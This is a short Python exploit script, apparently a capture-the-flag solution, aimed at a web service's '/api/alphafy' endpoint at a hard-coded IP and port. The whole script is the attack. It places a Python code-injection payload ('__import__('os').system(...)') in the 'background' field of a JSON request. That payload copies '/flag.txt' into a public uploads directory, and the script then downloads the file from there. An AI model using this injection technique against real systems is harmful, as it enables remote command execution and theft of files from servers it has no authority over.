import requests
import re
import time

host, port = "94.237.48.12", 43302

url = f"http://{host}:{port}"
url_api = f"{url}/api/alphafy"
url_flag = f"{url}/static/uploads/flag.txt"

data = {
    "image": "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGNgYAAAAAMAAWgmWQ0AAAAASUVORK5CYII=",
    "background": [
        "__import__('os').system('cp /flag.txt /app/application/static/uploads/flag.txt')",
        255,
        255
    ]
}

response = requests.post(url_api, json=data)

flag = requests.get(url_flag)

print(flag.text)
